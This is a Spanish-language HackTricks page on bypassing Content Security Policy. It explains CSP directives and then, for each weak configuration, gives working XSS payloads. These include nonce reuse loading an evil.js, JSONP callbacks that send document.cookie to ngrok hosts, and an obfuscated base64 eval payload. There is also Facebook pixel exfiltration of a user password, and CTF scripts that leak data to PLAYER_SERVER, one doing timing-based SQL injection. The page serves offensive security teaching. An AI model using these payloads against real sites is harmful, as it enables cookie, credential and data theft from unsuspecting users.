# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## ¿Qué es CSP

Content Security Policy (CSP) es una tecnología de navegador, orientada principalmente a **proteger frente a ataques como cross-site scripting (XSS)**. Funciona definiendo y especificando rutas y orígenes desde los cuales el navegador puede cargar recursos de forma segura. Estos recursos comprenden una variedad de elementos como imágenes, frames y JavaScript. Por ejemplo, una política podría permitir la carga y ejecución de recursos desde el mismo dominio (self), incluyendo recursos inline y la ejecución de código en forma de string mediante funciones como `eval`, `setTimeout` o `setInterval`.

La implementación de CSP se realiza mediante **cabeceras de respuesta** o incorporando **elementos meta en la página HTML**. Siguiendo esta política, los navegadores aplican proactivamente estas directivas y bloquean de inmediato cualquier violación detectada.

- Implementado vía cabecera de respuesta:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Implementado vía meta tag:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Encabezados

CSP puede aplicarse o supervisarse mediante estos encabezados:

- `Content-Security-Policy`: Hace cumplir la CSP; el navegador bloquea cualquier violación.
- `Content-Security-Policy-Report-Only`: Usado para monitoreo; reporta violaciones sin bloquearlas. Ideal para pruebas en entornos de preproducción.

### Definiendo Recursos

CSP restringe los orígenes desde los que se cargan tanto contenido activo como pasivo, controlando aspectos como la ejecución de JavaScript en línea y el uso de `eval()`. Un ejemplo de política es:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directivas

- **script-src**: Permite fuentes específicas para JavaScript, incluyendo URLs, scripts inline y scripts activados por manejadores de eventos o hojas de estilo XSLT.
- **default-src**: Establece una política por defecto para la obtención de recursos cuando no existen directivas específicas.
- **child-src**: Especifica recursos permitidos para web workers y el contenido de frames embebidos.
- **connect-src**: Restringe las URLs que pueden cargarse usando interfaces como fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Restringe las URLs para frames.
- **frame-ancestors**: Especifica qué fuentes pueden embeber la página actual, aplicable a elementos como `<frame>`, `<iframe>`, `<object>`, `<embed>`, y `<applet>`.
- **img-src**: Define fuentes permitidas para imágenes.
- **font-src**: Especifica fuentes válidas para las fuentes cargadas usando `@font-face`.
- **manifest-src**: Define fuentes permitidas para archivos de manifiesto de la aplicación.
- **media-src**: Define fuentes permitidas para cargar objetos multimedia.
- **object-src**: Define fuentes permitidas para los elementos `<object>`, `<embed>`, y `<applet>`.
- **base-uri**: Especifica URLs permitidas para cargarse mediante elementos `<base>`.
- **form-action**: Lista endpoints válidos para el envío de formularios.
- **plugin-types**: Restringe los tipos MIME que una página puede invocar.
- **upgrade-insecure-requests**: Indica a los navegadores reescribir URLs HTTP a HTTPS.
- **sandbox**: Aplica restricciones similares al atributo sandbox de un `<iframe>`.
- **report-to**: Especifica un grupo al que se enviará un informe si la política se viola.
- **worker-src**: Especifica fuentes válidas para scripts de Worker, SharedWorker o ServiceWorker.
- **prefetch-src**: Especifica fuentes válidas para recursos que serán obtenidos o precargados.
- **navigate-to**: Restringe las URLs a las que un documento puede navegar por cualquier medio (a, form, window.location, window.open, etc.)

### Orígenes

- `*`: Permite todas las URLs excepto las que usan esquemas `data:`, `blob:`, `filesystem:`.
- `'self'`: Permite la carga desde el mismo dominio.
- `'data'`: Permite que recursos se carguen vía el esquema data (p. ej., imágenes codificadas en Base64).
- `'none'`: Bloquea la carga desde cualquier fuente.
- `'unsafe-eval'`: Permite el uso de `eval()` y métodos similares; no se recomienda por razones de seguridad.
- `'unsafe-hashes'`: Habilita manejadores de eventos inline específicos.
- `'unsafe-inline'`: Permite el uso de recursos inline como `<script>` o `<style>`; no se recomienda por razones de seguridad.
- `'nonce'`: Una lista blanca para scripts inline específicos que usan un nonce criptográfico (número usado una vez).
- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>Cargar script reutilizando nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Añade a la lista blanca scripts con un hash sha256 específico.
- `'strict-dynamic'`: Permite cargar scripts desde cualquier fuente si han sido añadidos a la lista blanca mediante un nonce o hash.
- `'host'`: Especifica un host concreto, como `example.com`.
- `https:`: Restringe las URLs a las que usan HTTPS.
- `blob:`: Permite cargar recursos desde Blob URLs (p. ej., Blob URLs creadas mediante JavaScript).
- `filesystem:`: Permite cargar recursos desde el sistema de archivos.
- `'report-sample'`: Incluye una muestra del código que viola la política en el informe de violación (útil para depuración).
- `'strict-origin'`: Similar a 'self' pero asegura que el nivel de seguridad del protocolo de las fuentes coincide con el del documento (solo orígenes seguros pueden cargar recursos desde orígenes seguros).
- `'strict-origin-when-cross-origin'`: Envía URLs completas al hacer peticiones same-origin, pero solo envía el origen cuando la petición es cross-origin.
- `'unsafe-allow-redirects'`: Permite cargar recursos que redirigirán inmediatamente a otro recurso. No recomendado ya que debilita la seguridad.

## Reglas CSP inseguras

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Payload funcional: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' a través de Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Esto no funciona; para más información [**consulta esto**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Payload funcional:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Si de alguna manera puedes hacer que un **allowed JS code created a new script tag** en el DOM con tu JS, dado que un allowed script lo está creando, el **new script tag will be allowed to be executed**.

### Comodín (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Payload funcional:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Falta de object-src y default-src

> [!CAUTION] > **Parece que esto ya no funciona**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Payloads funcionales:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### File Upload + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Si puedes subir un archivo JS, puedes evadir este CSP:

Payload funcional:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
Sin embargo, es muy probable que el servidor esté **validando el archivo subido** y solo te permita **subir determinados tipos de archivos**.

Además, incluso si pudieras subir un **JS code inside** en un archivo usando una extensión aceptada por el servidor (como: _script.png_) esto no será suficiente porque algunos servidores como apache server **select MIME type of the file based on the extension** y navegadores como Chrome **reject to execute Javascript** código dentro de algo que debería ser una imagen. "Por suerte", hay errores. Por ejemplo, en un CTF aprendí que **Apache doesn't know** la extensión _**.wave**_, por lo tanto no la sirve con un **MIME type like audio/***.

A partir de aquí, si encuentras un XSS y un file upload, y logras encontrar una **misinterpreted extension**, podrías intentar subir un archivo con esa extensión y el contenido del script. O, si el servidor está comprobando el formato correcto del archivo subido, crea un polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

If not possible to inject JS, you could still try to exfiltrate for example credentials **injecting a form action** (and maybe expecting password managers to auto-fill passwords). You can find an [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Además, ten en cuenta que `default-src` no cubre las acciones de formulario.

> [!WARNING]
> Para algunos de los siguientes payloads **`unsafe-eval` ni siquiera es necesario**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Cargar una versión vulnerable de angular y ejecutar JS arbitrario:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads usando Angular + una librería con funciones que devuelven el `window` object ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> El post muestra que puedes **cargar** todas las **librerías** desde `cdn.cloudflare.com` (o cualquier otro repo permitido de librerías JS), ejecutar todas las funciones añadidas de cada librería y comprobar **qué funciones de qué librerías devuelven el objeto `window`**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS desde un nombre de clase:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Abusar del código JS de google recaptcha

Según [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) puedes abusar de [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) dentro de una CSP para ejecutar código JS arbitrario eludiendo la CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Más [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Abusar de www.google.com para un open redirect

La siguiente URL redirige a example.com (desde [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Abusar de \*.google.com/script.google.com

Es posible abusar de Google Apps Script para recibir información en una página dentro de script.google.com. Como se hizo en este informe: https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/.

### Endpoints de terceros + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Escenarios como este en los que `script-src` está establecido en `self` y un dominio concreto que está whitelisted pueden ser bypassed usando JSONP. Los endpoints JSONP permiten métodos de callback inseguros que permiten a un atacante realizar XSS. Payload funcional:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **contiene endpoints JSONP listos para usar para CSP bypass de diferentes sitios web.**

La misma vulnerabilidad ocurrirá si el **trusted endpoint contiene un Open Redirect**, porque si el endpoint inicial es trusted, los redirects serán considerados confiables.

### Abusos de terceros

Como se describe en el [siguiente post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), hay muchos dominios de terceros que, si están permitidos en la CSP, pueden ser abusados para exfiltrar datos o ejecutar código JavaScript. Algunos de estos terceros son:

| Entidad           | Dominio permitido                             | Capacidades  |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Si encuentras alguno de los dominios permitidos en la CSP de tu objetivo, es probable que puedas eludir la CSP registrándote en el servicio de terceros y, ya sea exfiltrar datos a ese servicio o ejecutar código.

Por ejemplo, si encuentras la siguiente CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
o
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Deberías poder exfiltrar datos, de manera similar a como siempre se ha hecho con [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). En este caso, sigue estos pasos generales:

1. Crea una cuenta de Facebook Developer aquí.
2. Crea una nueva app "Facebook Login" y selecciona "Website".
3. Ve a "Settings -> Basic" y obtén tu "App ID"
4. En el sitio objetivo del que quieres exfiltrar datos, puedes exfiltrar datos usando directamente el gadget del Facebook SDK "fbq" mediante un "customEvent" y la carga útil de datos.
5. Accede a tu App "Event Manager" y selecciona la aplicación que creaste (nota el event manager puede encontrarse en una URL similar a esta: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. Selecciona la pestaña "Test Events" para ver los eventos enviados por "tu" sitio web.

Luego, on the victim side, ejecuta el siguiente código para inicializar el Facebook tracking pixel para apuntar al app-id de la Facebook developer account del attacker y emitir un custom event como este:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
En cuanto a los otros siete dominios de terceros especificados en la tabla anterior, hay muchas otras formas en las que puedes abusar de ellos. Consulta la [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) mencionada anteriormente para explicaciones adicionales sobre otros abusos de terceros.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Además de la redirección mencionada anteriormente para bypass path restrictions, existe otra técnica llamada Relative Path Overwrite (RPO) que puede usarse en algunos servidores.

Por ejemplo, si CSP permite la ruta `https://example.com/scripts/react/`, puede bypassarse de la siguiente manera:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
El navegador finalmente cargará `https://example.com/scripts/angular/angular.js`.

Esto funciona porque para el navegador estás cargando un archivo llamado `..%2fangular%2fangular.js` ubicado bajo `https://example.com/scripts/react/`, lo cual cumple con la CSP.

Entonces lo decodifica, solicitando efectivamente `https://example.com/scripts/react/../angular/angular.js`, que es equivalente a `https://example.com/scripts/angular/angular.js`.

Al **explotar esta inconsistencia en la interpretación de URL entre el navegador y el servidor, las reglas de ruta pueden ser eludidas**.

La solución es no tratar `%2f` como `/` en el lado del servidor, asegurando una interpretación consistente entre el navegador y el servidor para evitar este problema.

Ejemplo en línea:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Ejecución de JS en iframes


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### **base-uri** ausente

Si la directiva **base-uri** falta, puedes abusar de ella para realizar un [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

Además, si la **página está cargando un script usando una ruta relativa** (como `<script src="/js/app.js">`) usando un **Nonce**, puedes abusar de la etiqueta **base** para hacer que cargue el script desde **tu propio servidor, logrando un XSS.**\
Si la página vulnerable se carga con **httpS**, usa una URL httpS en la base.
```html
<base href="https://www.attacker.com/" />
```
### Eventos de AngularJS

Una política específica conocida como Content Security Policy (CSP) puede restringir los eventos de JavaScript. No obstante, AngularJS introduce eventos personalizados como alternativa. Dentro de un evento, AngularJS proporciona un objeto único `$event`, que referencia el objeto de evento nativo del navegador. Este objeto `$event` puede explotarse para eludir la CSP. Cabe destacar que en Chrome, el objeto `$event/event` posee un atributo `path` que contiene un array de objetos implicados en la cadena de ejecución del evento, con el objeto `window` siempre situado al final. Esta estructura es clave para las tácticas de sandbox escape.

Dirigiendo este array al filtro `orderBy`, es posible iterar sobre él, aprovechando el elemento terminal (el objeto `window`) para invocar una función global como `alert()`. El fragmento de código mostrado a continuación ilustra este proceso:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Este fragmento destaca el uso de la directiva `ng-focus` para activar el evento, empleando `$event.path|orderBy` para manipular el arreglo `path`, y aprovechando el objeto `window` para ejecutar la función `alert()`, revelando así `document.cookie`.

**Find other Angular bypasses in** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS y whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Una política CSP que restringe la carga de scripts a dominios permitidos en una aplicación Angular JS puede ser eludida mediante la invocación de callback functions y ciertas clases vulnerables. Más información sobre esta técnica se puede encontrar en una guía detallada disponible en este [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Otros endpoints JSONP de ejecución arbitraria se pueden encontrar en [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (algunos de ellos fueron eliminados o corregidos)

### Bypass via Redirection

¿Qué sucede cuando CSP encuentra una redirección del lado del servidor? Si la redirección conduce a un origen diferente que no está permitido, aún fallará.

Sin embargo, según la descripción en [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), si la redirección conduce a una ruta diferente, puede eludir las restricciones originales.

Aquí hay un ejemplo:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Si CSP está establecido en `https://www.google.com/a/b/c/d`, dado que se considera la ruta, tanto los scripts `/test` como `/a/test` serán bloqueados por CSP.

Sin embargo, el recurso final `http://localhost:5555/301` será **redireccionado en el servidor a `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Como es una redirección, la **ruta no se considera**, y el **script puede cargarse**, evitando así la restricción de ruta.

Con esta redirección, incluso si la ruta está especificada completamente, seguirá siendo eludida.

Por lo tanto, la mejor solución es asegurarse de que el sitio web no tenga vulnerabilidades de open redirect y de que no existan dominios que puedan ser explotados en las reglas de CSP.

### Bypass CSP with dangling markup

Lee cómo hacerlo [aquí](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` significa que puedes ejecutar cualquier script dentro del código (XSS puede ejecutar código) y `img-src *` significa que puedes usar en la página web cualquier imagen de cualquier recurso.

Puedes eludir esta CSP exfiltrando los datos a través de imágenes (en esta ocasión el XSS abusa de un CSRF donde una página accesible por el bot contiene un SQLi, y extrae la flag mediante una imagen):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

También podrías abusar de esta configuración para **cargar código javascript insertado dentro de una imagen**. Si, por ejemplo, la página permite cargar imágenes desde Twitter, podrías **crear** una **imagen especial**, **subirla** a Twitter y abusar de "**unsafe-inline**" para **ejecutar** un código JS (como un XSS normal) que **cargará** la **imagen**, **extraerá** el **JS** de ella y **lo ejecutará**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Con Service Workers

La función `importScripts` de Service Workers no está limitada por CSP:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Investigación:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Si un **parámetro** enviado por ti está siendo **pegado dentro** de la **declaración** de la **política**, entonces podrías **alterar** la **política** de alguna manera que la haga **inútil**. Podrías **allow script 'unsafe-inline'** con cualquiera de estos bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Because this directive will **overwrite existing script-src directives**.\
You can find an example here: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

En Edge es mucho más simple. Si puedes añadir en la CSP solo esto: **`;_`** **Edge** eliminaría toda la **policy**.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; vía XSS (iframe) - Time attack

Observa la ausencia de la directiva `'unsafe-inline'`\
Esta vez puedes hacer que la víctima **cargue** una página bajo **tu control** vía **XSS** con un `<iframe`. En esta ocasión harás que la víctima acceda a la página desde la que quieres extraer información (**CSRF**). No puedes acceder al contenido de la página, pero si de alguna forma puedes **controlar el tiempo que la página tarda en cargar** puedes extraer la información que necesitas.

Esta vez se va a extraer una **flag**: cada vez que un **char es adivinado correctamente** vía SQLi, la **respuesta** tarda **más tiempo** debido a la función sleep. Entonces, podrás extraer la flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Vía Bookmarklets

Este ataque implicaría algo de ingeniería social donde el atacante **convence al usuario de arrastrar y soltar un enlace sobre el bookmarklet del navegador**. Este bookmarklet contendría **javascript malicioso** que, al ser arrastrado y soltado o al hacer clic, se ejecutaría en el contexto de la ventana web actual, **eludiendo CSP y permitiendo robar información sensible** como cookies o tokens.

Para más información [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass by restricting CSP

En [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), se elude CSP inyectando dentro de un iframe permitido un CSP más restrictivo que impedía cargar un archivo JS específico que, a su vez, mediante **prototype pollution** o **dom clobbering**, permitía **abusar de un script diferente para cargar un script arbitrario**.

Puedes **restringir el CSP de un Iframe** con el atributo **`csp`**:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
En [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), fue posible vía **HTML injection** **restringir** más una **CSP** de modo que un **script** que prevenía **CSTI** fue deshabilitado y por lo tanto la **vulnerability became exploitable.**\
CSP puede volverse más restrictiva usando **HTML meta tags** y los inline scripts pueden ser deshabilitados **eliminando** la **entrada** que permite su **nonce** y **habilitar inline script específico vía sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration with Content-Security-Policy-Report-Only

Si puedes lograr que el servidor responda con la cabecera **`Content-Security-Policy-Report-Only`** con un **valor controlado por ti** (quizá debido a un CRLF), podrías hacer que apunte a tu servidor y, si **envuelves** el **JS content** que quieres exfiltrar con **`<script>`**, y dado que es muy probable que `unsafe-inline` no esté permitido por la CSP, esto **provocará un error de CSP** y parte del script (que contiene la información sensible) será enviada al servidor a través de `Content-Security-Policy-Report-Only`.

For an example [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

